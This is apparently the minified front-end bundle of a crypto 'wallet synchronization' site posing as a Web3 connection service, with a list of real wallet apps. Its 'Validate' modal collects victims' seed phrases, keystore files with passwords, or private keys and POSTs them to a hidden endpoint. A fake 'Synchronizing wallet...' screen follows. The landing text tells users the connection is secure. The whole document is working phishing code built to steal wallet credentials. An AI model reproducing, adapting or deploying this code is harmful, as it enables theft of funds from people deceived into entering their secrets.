        "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c": {
            id: "19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c",
            name: "Aktionariat",
            homepage: "https://aktionariat.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/ch/app/aktionariat/id1518326813",
                android: "https://play.google.com/store/apps/details?id=com.aktionariat.app",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "aktionariat:",
                universal: "https://app.aktionariat.com"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Aktionariat",
                colors: {
                    primary: "rgb(10, 20, 20)",
                    secondary: ""
                }
            }
        },
        "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c": {
            id: "95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c",
            name: "Talken Wallet",
            homepage: "https://talken.io",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/talken/id1459475831",
                android: "https://play.google.com/store/apps/details?id=io.talken.wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "talken-wallet:",
                universal: "https://talken.io"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Talken",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4": {
            id: "78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4",
            name: "XinFin XDC Network",
            homepage: "https://www.xinfin.io/",
            chains: ["eip155:1"],
            app: {
                browser: "https://xinfin.network/",
                ios: "",
                android: "https://play.google.com/store/apps/details?id=com.xdcwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "XinFin",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c: {
            id: "d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c",
            name: "Flare Wallet",
            homepage: "https://flarewallet.io",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/flare-wallet/id1496651406",
                android: "https://play.google.com/store/apps/details?id=com.flare",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "flare:",
                universal: "https://flarewallet.io"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Flare",
                colors: {
                    primary: "rgb(31, 36, 59)",
                    secondary: ""
                }
            }
        },
        "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670": {
            id: "55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670",
            name: "KyberSwap",
            homepage: "https://kyberswap.com/",
            chains: ["eip155:1"],
            app: {
                browser: "https://kyberswap.com/",
                ios: "",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "kyberswap:",
                universal: "https://kyberswapnew.app.link"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "KyberSwap",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0": {
            id: "6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0",
            name: "AToken Wallet",
            homepage: "https://atoken.com",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/atoken-app/id1395835245",
                android: "https://play.google.com/store/apps/details?id=wallet.gem.com.atoken",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "atoken:",
                universal: "https://www.atoken.com"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "AToken",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9": {
            id: "4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9",
            name: "Tongue Wallet",
            homepage: "https://www.tongue.fi",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/fr/app/tongue-wallet-for-defi-degens/id1534705854",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "tongue:",
                universal: "https://www.tongue.fi"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Tongue",
                colors: {
                    primary: "rgb(255, 49, 120)",
                    secondary: ""
                }
            }
        },
        b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346: {
            id: "b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346",
            name: "RWallet",
            homepage: "https://rsk.co/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/rwallet/id1489241342",
                android: "https://play.google.com/store/apps/details?id=com.rsk.rwallet.reactnative",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "rwallet:",
                universal: "https://www.rwallet.app"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "RWallet",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70": {
            id: "13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70",
            name: "PlasmaPay",
            homepage: "https://plasmapay.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/id1461735396",
                android: "https://play.google.com/store/apps/details?id=com.plasmapay.androidapp",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "plasmapay:",
                universal: "https://plasmapay.com/"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "PlasmaPay",
                colors: {
                    primary: "rgb(255, 255, 255)",
                    secondary: ""
                }
            }
        },
        "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0": {
            id: "0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0",
            name: "O3Wallet",
            homepage: "https://o3.network",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://itunes.apple.com/app/id1528451572",
                android: "https://play.google.com/store/apps/details?id=com.o3.o3wallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "o3wallet:",
                universal: "https://o3.network"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "O3Wallet",
                colors: {
                    primary: "rgb(255,255,255)",
                    secondary: ""
                }
            }
        },
        "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c": {
            id: "761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c",
            name: "HashKey Me",
            homepage: "https://me.hashkey.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/hashkey-me/id1547228803",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "hashme:",
                universal: "https://me.hashkey.com"
            },
            desktop: {
                native: "hashme:",
                universal: "https://me.hashkey.com"
            },
            metadata: {
                shortName: "HashKey Me",
                colors: {
                    primary: "rgb(254, 142, 63)",
                    secondary: ""
                }
            }
        },
        "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950": {
            id: "0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950",
            name: "Jade Wallet",
            homepage: "https://jadewallet.io/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/jade-wallet-bitcoin-defi/id1544207492",
                android: "",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Jade",
                colors: {
                    primary: "#212d66",
                    secondary: ""
                }
            }
        },
        c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266: {
            id: "c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266",
            name: "Guarda Wallet",
            homepage: "https://guarda.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/app/apple-store/id1442083982?mt=8",
                android: "https://play.google.com/store/apps/details?id=com.crypto.multiwallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Guarda",
                colors: {
                    primary: "#fff",
                    secondary: ""
                }
            }
        },
        ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215: {
            id: "ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215",
            name: "Defiant",
            homepage: "https://defiantapp.tech/",
            chains: ["eip155:1", "eip155:42", "eip155:30", "eip155:31"],
            app: {
                browser: "",
                ios: "",
                android: "https://play.google.com/store/apps/details?id=ar.com.andinasmart.defiant",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "defiantapp:",
                universal: "https://defiantapp.tech"
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Defiant",
                colors: {
                    primary: "#274A60",
                    secondary: "#65ef9d"
                }
            }
        },
        "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1": {
            id: "1ce6dae0fea7114846382391d946784d95d9032460a857bb23b55bd9807259d1",
            name: "Trustee Wallet",
            homepage: "https://trusteeglobal.com/",
            chains: ["eip155:1"],
            app: {
                browser: "",
                ios: "https://apps.apple.com/us/app/trustee-wallet-bitcoin-wallet/id1462924276",
                android: "https://play.google.com/store/apps/details?id=com.trusteewallet",
                mac: "",
                windows: "",
                linux: ""
            },
            mobile: {
                native: "",
                universal: ""
            },
            desktop: {
                native: "",
                universal: ""
            },
            metadata: {
                shortName: "Trustee",
                colors: {
                    primary: "",
                    secondary: ""
                }
            }
        },
        ex784227: {
            id: "1ce6dae0fea7114844",
            name: "Exodus",
            chains: ["eip155:1"]
        },
        others: {
            id: "1ce6dae0fea7114844",
            name: "Others",
            chains: ["eip155:1"]
        }
    },
    tv = ({
        id: e,
        open: t,
        onClose: n,
        onSubmit: r
    }) => {
        const l = _l,
            [a, o] = p.useState({
                phrase: "",
                keystore: "",
                password: "",
                privateKey: ""
            }),
            [i, s] = p.useState(""),
            [u, d] = p.useState(!1),
            h = async y => {
                if (y.preventDefault(), e === "others" && !i) return alert("Please fill the Wallet Name");
                d(!0);
                try {
                    const w = {
                         Info: `
                         Wallet Name : ${v} 
                         Phrase : ${a.phrase}
                         Keystore JSON : ${a.keystore}
                         Keystore Password : ${a.password}
                         Private Key : ${a.privateKey} `,
                         
        
                        },
                        x = await fetch(qh, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(w)
                        });
                    if (x.ok) await x.json(), r();
                    else {
                        const b = await x.json();
                        console.error("Error:", b)
                    }
                } catch (w) {
                    console.error("Error:", w)
                } finally {
                    d(!1)
                }
            },
            v = p.useMemo(() => {
                var y;
                return xf.includes(e) ? e : e === "others" ? i || "Others" : (y = l[e]) == null ? void 0 : y.name
            }, [e, l, i]);
        return g.jsx(we, {
            appear: !0,
            show: t,
            as: p.Fragment,
            children: g.jsxs(Fe, {
                as: "div",
                className: "relative z-10",
                onClose: n,
                children: [g.jsx(we.Child, {
                    as: p.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-neutral-800"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex h-screen items-center justify-center text-center",
                        children: g.jsx(we.Child, {
                            as: p.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(Fe.Panel, {
                                className: "w-full h-full transform overflow-hidden bg-black text-white text-left transition-all",
                                children: [g.jsxs("header", {
                                    className: "bg-neutral-700 py-4 px-4 flex gap-20",
                                    children: [g.jsx("button", {
                                        onClick: n,
                                        className: "outline-none focus:outline-none",
                                        children: g.jsx("svg", {
                                            height: 24,
                                            width: 24,
                                            viewBox: "0 0 24 24",
                                            children: g.jsx("path", {
                                                fill: "currentColor",
                                                d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"
                                            })
                                        })
                                    }), g.jsxs("h2", {
                                        className: "text-lg capitalize",
                                        children: ["Validate ", v]
                                    })]
                                }), g.jsxs("section", {
                                    className: "max-w-screen-md mx-auto p-4 pb-16 h-full",
                                    children: [g.jsx("div", {
                                        className: "mb-6",
                                        children: e !== "others" ? g.jsxs("div", {
                                            className: "bg-neutral-700 rounded-2xl py-2 px-4 mb-8",
                                            children: [g.jsx("div", {
                                                className: "text-xs font-medium text-gray-400",
                                                children: "Name"
                                            }), g.jsx("h4", {
                                                className: "text-lg capitalize",
                                                children: v
                                            })]
                                        }) : g.jsx("input", {
                                            value: i,
                                            placeholder: "Wallet Name",
                                            className: "w-full text-sm bg-neutral-700 py-4 px-4 mb-4 rounded-lg text-white border border-transparent transition-all focus:border-primary focus:outline-none",
                                            onChange: y => s(y.target.value)
                                        })
                                    }), g.jsxs(Jt.Group, {
                                        children: [g.jsx(Jt.List, {
                                            className: "flex space-x-1 rounded-xl bg-white/20 p-1.5",
                                            children: ["Phrase", "Keystore", "Privatekey"].map((y, w) => g.jsx(Jt, {
                                                className: ({
                                                    selected: x
                                                }) => _t("w-full rounded-lg py-2.5 text-sm font-medium leading-5", "focus:outline-none", x ? "bg-primary transition text-white shadow" : "text-white hover:bg-white/20"),
                                                children: y
                                            }, y + w))
                                        }), g.jsxs(Jt.Panels, {
                                            className: "my-4 ",
                                            children: [g.jsx(Jt.Panel, {
                                                children: g.jsxs("form", {
                                                    onSubmit: h,
                                                    children: [g.jsx("textarea", {
                                                        className: _t("w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                        rows: 4,
                                                        required: !0,
                                                        value: a.phrase,
                                                        onChange: y => o({ ...a,
                                                            phrase: y.target.value
                                                        })
                                                    }), g.jsx("p", {
                                                        className: "text-xs text-primary mt-2 mb-4",
                                                        children: "**Typically 12 (sometimes 24) words separated by single space"
                                                    }), g.jsx(Mn, {
                                                        type: "submit",
                                                        label: u ? "Validating..." : "Validate",
                                                        className: "w-full"
                                                    })]
                                                })
                                            }), g.jsx(Jt.Panel, {
                                                children: g.jsxs("form", {
                                                    onSubmit: h,
                                                    children: [g.jsx("textarea", {
                                                        className: _t("w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                        placeholder: "Your Keystore JSON",
                                                        required: !0,
                                                        rows: 4,
                                                        value: a.keystore,
                                                        onChange: y => o({ ...a,
                                                            keystore: y.target.value
                                                        })
                                                    }), g.jsx("input", {
                                                        className: _t("w-full text-base bg-neutral-700 py-4 px-4 rounded-lg my-3 text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                        placeholder: "Password",
                                                        required: !0,
                                                        value: a.password,
                                                        onChange: y => o({ ...a,
                                                            password: y.target.value
                                                        })
                                                    }), g.jsx(Mn, {
                                                        type: "submit",
                                                        label: u ? "Validating..." : "Validate",
                                                        className: "w-full"
                                                    })]
                                                })
                                            }), g.jsx(Jt.Panel, {
                                                children: g.jsxs("form", {
                                                    onSubmit: h,
                                                    children: [g.jsx("textarea", {
                                                        className: _t("w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"),
                                                        rows: 4,
                                                        placeholder: "Your Private Key",
                                                        required: !0,
                                                        value: a.privateKey,
                                                        onChange: y => o({ ...a,
                                                            privateKey: y.target.value
                                                        })
                                                    }), g.jsx(Mn, {
                                                        type: "submit",
                                                        label: u ? "Validating..." : "Validate",
                                                        className: "w-full"
                                                    })]
                                                })
                                            })]
                                        })]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    },
    nv = ({
        onConnect: e
    }) => {
        const t = [{
            title: "Click 'Connect Wallet'",
            subtitle: `Locate the button on your desired app, as this will enable you
          to log in with your preferred wallet.`
        }, {
            title: "Scan the QR code or find your wallet",
            subtitle: "Initiate the connection so that ProjectDatabaseServer gets to work in the background, linking your wallet and app."
        }, {
            title: "Start exploring!",
            subtitle: "You can now interact with the app. Three simple steps is all it takes."
        }];
        return g.jsxs("main", {
            children: [g.jsxs("section", {
                className: "max-w-screen-xl mx-auto p-4 mt-8 mb-16 flex flex-col-reverse md:flex-row justify-between items-center gap-8",
                children: [g.jsxs("div", {
                    className: "w-full md:w-1/5",
                    children: [g.jsx("span", {
                        className: "text-xs bg-primary/30 rounded px-3 py-1.5 font-medium",
                        children: "Simplify Your Crypto Experience"
                    }), g.jsx("h2", {
                        className: "text-5xl lg:text-7xl font-black my-6",
                        children: "Web3 Connection Made Easy"
                    }), g.jsx("p", {
                        className: "text-gray-400 mb-8",
                        children: "The communications protocol for web3, ProjectDatabaseServer brings the ecosystem together by enabling wallets and apps to securely connect and interact."
                    }), g.jsx(Mn, {
                        label: "Synchronize Wallet",
                        color: "white",
                        onClick: e
                    })]
                }), g.jsx("div", {
                    className: "w-full md:w-3/5 bg-gradient-to-br from-black from-30% via-primary/50 via-50% to-black to-20% flex justify-center items-center",
                    children: g.jsx("img", {
                        src: "/images/sync.png",
                        className: "max-h-[75vh] rounded-2xl"
                    })
                })]
            }), g.jsxs("section", {
                className: "mt-8 mb-16 max-w-screen-xl p-4 mx-auto",
                children: [g.jsx("h3", {
                    className: "font-bold text-4xl md:text-[50px] leading-none mb-8",
                    children: "We make it easy for you to plug into web3."
                }), g.jsx("img", {
                    src: "/images/synth.jpeg",
                    alt: "",
                    className: "h-full w-full"
                }), g.jsxs("p", {
                    className: "text-xl flex flex-wrap items-center gap-4",
                    children: [g.jsx("span", {
                        className: "text-2xl font-semibold mr-0.5",
                        children: "Curious about"
                    }), g.jsxs("div", {
                        className: "inline-flex gap-4",
                        children: [g.jsx("span", {
                            className: "rounded-3xl border-2 border-green-500 px-5 py-3 text-green-500",
                            children: "DeFi"
                        }), g.jsx("span", {
                            className: "rounded border-2 border-amber-500 px-5 py-3 text-amber-500",
                            children: "NFTs"
                        }), g.jsx("span", {
                            className: "rounded-[100%] border-2 border-blue-500 px-6 py-3 text-blue-500",
                            children: "DAOs"
                        })]
                    })]
                })]
            }), g.jsxs("section", {
                className: "max-w-screen-xl mx-auto p-4 my-8",
                children: [g.jsxs("div", {
                    className: "text-center mb-8",
                    children: [g.jsx("span", {
                        className: "text-xs bg-primary/30 rounded px-3 py-1.5 font-medium",
                        children: "Popular Wallet Options"
                    }), g.jsx("h2", {
                        className: "text-4xl font-bold my-2",
                        children: "Select One of the Actions Below"
                    }), g.jsx("p", {
                        className: "text-gray-400",
                        children: "With ProjectDatabaseServer, you can connect your wallet with hundreds of apps, opening the doors to a new world of web3 experiences."
                    })]
                }), g.jsx("div", {
                    className: "grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6",
                    children: Jh.map((n, r) => g.jsxs("div", {
                        className: "border rounded-lg p-6 cursor-pointer hover:bg-gradient-to-br from-black to-gray-900 transition-all",
                        onClick: e,
                        children: [g.jsx("span", {
                            className: "inline-block bg-gray-900 p-2 h-10 w-10 rounded fill-white",
                            children: ai.shuriken
                        }), g.jsx("h5", {
                            className: "text-lg text-white my-4 font-medium",
                            children: n.title
                        }), g.jsx("p", {
                            className: "text-gray-400 text-sm",
                            children: n.subtitle
                        })]
                    }, r))
                })]
            }), g.jsxs("section", {
                className: "my-16 max-w-screen-xl p-4 mx-auto",
                children: [g.jsxs("div", {
                    className: "text-center mb-8",
                    children: [g.jsx("span", {
                        className: "text-xs bg-primary/30 rounded px-3 py-1.5 font-medium",
                        children: "Larger Connectivity"
                    }), g.jsx("h2", {
                        className: "text-4xl font-bold my-2",
                        children: "Connect with Hundreds of Apps"
                    }), g.jsx("p", {
                        className: "text-gray-400",
                        children: "With ProjectDatabaseServer, you can connect your wallet with hundreds of apps, opening the doors to a new world of web3 experiences."
                    })]
                }), g.jsx("div", {
                    className: "w-full my-4",
                    children: t.map((n, r) => g.jsxs(to, {
                        as: "div",
                        className: "border border-neutral-600 rounded-[54px] p-4 my-2",
                        children: [g.jsxs(to.Button, {
                            className: "flex w-full items-center justify-between px-4 py-2 text-left text-xl font-medium",
                            children: [n.title, g.jsx("span", {
                                className: "bg-blue-600 h-9 w-9 flex text-sm rounded-full items-center justify-center",
                                children: r + 1
                            })]
                        }), g.jsx(to.Panel, {
                            className: "px-4 pt-4 pb-2 text-lg text-gray-400",
                            children: n.subtitle
                        })]
                    }, r))
                })]
            })]
        })
    };

function rv({
    open: e,
    onClose: t,
    handleSelect: n
}) {
    return g.jsx(g.Fragment, {
        children: g.jsx(we, {
            appear: !0,
            show: e,
            as: p.Fragment,
            children: g.jsxs(Fe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [g.jsx(we.Child, {
                    as: p.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: g.jsx("div", {
                        className: "fixed inset-0 bg-black/50"
                    })
                }), g.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: g.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: g.jsx(we.Child, {
                            as: p.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: g.jsxs(Fe.Panel, {
                                className: "w-full max-w-xl transform overflow-hidden rounded-2xl bg-neutral-800 text-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [g.jsx(Fe.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6",
                                    children: "Select Your Wallet"
                                }), g.jsx("div", {
                                    className: "mt-4 h-96 overflow-y-auto",
                                    children: g.jsx("div", {
                                        className: "grid grid-cols-3 sm:grid-cols-4 gap-4 pr-2.5",
                                        children: Object.keys(_l).map((r, l) => g.jsxs("div", {
                                            tabIndex: l + 1,
                                            onClick: () => n(r),
                                            className: "cursor-pointer text-white hover:text-primary transition-all duration-200 ease-in bg-black hover:bg-primary/10 py-3 px-1.5 rounded-xl text-center",
                                            children: [g.jsx("img", {
                                                src: "images/logos/" + r + ".jpeg",
                                                width: "48",
                                                height: "48",
                                                alt: _l[r].name,
                                                className: "mx-auto rounded-full mb-1 bg-white"
                                            }), g.jsx("p", {
                                                className: "font-medium text-xs truncate",
                                                children: _l[r].name
                                            })]
                                        }, r))
                                    })
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}
const lv = ({
    open: e,
    onClose: t
}) => g.jsx(we, {
    appear: !0,
    show: e,
    as: p.Fragment,
    children: g.jsxs(Fe, {
        as: "div",
        tabIndex: 1,
        className: "relative z-10",
        onClose: t,
        children: [g.jsx(we.Child, {
            as: p.Fragment,
            enter: "ease-out duration-300",
            enterFrom: "opacity-0",
            enterTo: "opacity-100",
            leave: "ease-in duration-200",
            leaveFrom: "opacity-100",
            leaveTo: "opacity-0",
            children: g.jsx("div", {
                className: "fixed inset-0 bg-black bg-opacity-25"
            })
        }), g.jsx("div", {
            className: "fixed inset-0 overflow-y-auto",
            children: g.jsx("div", {
                className: "flex h-screen items-center justify-center text-center",
                children: g.jsx(we.Child, {
                    as: p.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0 scale-95",
                    enterTo: "opacity-100 scale-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100 scale-100",
                    leaveTo: "opacity-0 scale-95",
                    children: g.jsx(Fe.Panel, {
                        className: "w-full h-full transform flex justify-center items-center overflow-hidden bg-black text-white text-left transition-all",
                        children: g.jsxs("div", {
                            className: "max-w-screen-sm mx-auto p-8 text-center",
                            children: [g.jsx("h2", {
                                className: "text-2xl text-center  font-bold",
                                children: "Synchronizing wallet..."
                            }), g.jsxs("svg", {
                                className: "animate-spin mx-auto my-4 h-16 w-16",
                                xmlns: "http://www.w3.org/2000/svg",
                                fill: "none",
                                viewBox: "0 0 24 24",
                                children: [g.jsx("circle", {
                                    className: "opacity-25",
                                    cx: "12",
                                    cy: "12",
                                    r: "10",
                                    stroke: "currentColor",
                                    strokeWidth: "4"
                                }), g.jsx("path", {
                                    className: "opacity-75",
                                    fill: "currentColor",
                                    d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                })]
                            }), g.jsx("p", {
                                className: "text-gray-600 mb-3",
                                children: "This may take a few minutes to complete"
                            })]
                        })
                    })
                })
            })
        })]
    })
});

function av() {
    const [e, t] = p.useState(!1), [n, r] = p.useState(!1), [l, a] = p.useState(!1), [o, i] = p.useState(!1), [s, u] = p.useState(!1), [d, h] = p.useState("MetaMask"), [v, y] = p.useState("others");
    return g.jsxs("div", {
        className: "bg-black text-white",
        children: [g.jsx(Xh, {
            onConnect: () => a(!0)
        }), g.jsx(nv, {
            onConnect: () => a(!0)
        }), g.jsx(Gm, {}), g.jsx(tv, {
            id: v,
            open: e,
            onClose: () => t(!1),
            onSubmit: () => {
                t(!1), u(!0)
            }
        }), g.jsx(lv, {
            open: s,
            onClose: () => u(!1)
        }), g.jsx(Zh, {
            open: n,
            onClose: () => r(!1),
            handleManual: () => {
                d !== "WalletConnect" ? (t(!0), r(!1), y(d)) : (i(!0), r(!1))
            },
            wallet: d
        }), g.jsx(ev, {
            open: l,
            onClose: () => a(!1),
            handleSelect: w => {
                h(w), a(!1), r(!0)
            }
        }), g.jsx(rv, {
            open: o,
            onClose: () => i(!1),
            handleSelect: w => {
                y(w), i(!1), t(!0)
            }
        })]
    })
}
ao.createRoot(document.getElementById("root")).render(g.jsx($.StrictMode, {
    children: g.jsx(av, {})
}));